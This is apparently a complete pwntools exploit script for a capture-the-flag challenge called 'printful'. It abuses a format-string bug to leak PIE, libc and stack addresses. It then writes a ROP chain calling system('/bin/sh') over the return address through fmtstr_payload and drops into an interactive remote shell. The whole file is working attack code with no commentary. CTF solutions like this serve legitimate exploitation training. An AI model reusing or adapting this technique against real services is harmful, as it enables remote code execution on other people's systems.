#!/usr/bin/env python3
from pwn import *

libc = ELF('./libc.so.6')
context.arch = 'amd64'

io = remote("printful.challs.pwnoh.io", 1337, ssl=True)

io.sendlineafter(b"> ", b"%lx")
pie_base = int(io.recvline().strip().decode(), 16) - 0x200b

io.sendlineafter(b"> ", b"%7$s".ljust(8, b' ') + p64(pie_base+0x3fa8))
libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym.puts

io.sendlineafter(b"> ", b"%7$s".ljust(8, b' ') + p64(libc.sym.environ))
rip = u64(io.recv(6).ljust(8, b'\x00')) - 256

io.sendlineafter(b"> ", fmtstr_payload(6, {rip: libc.address+0x23b6a}))
io.sendlineafter(b"> ", fmtstr_payload(6, {rip+0x8: next(libc.search(b"/bin/sh\x00"))}))
io.sendlineafter(b"> ", fmtstr_payload(6, {rip+0x10: libc.address+0x22679}))
io.sendlineafter(b"> ", fmtstr_payload(6, {rip+0x18: libc.sym.system}))
io.sendlineafter(b"> ", b"q")
io.interactive()

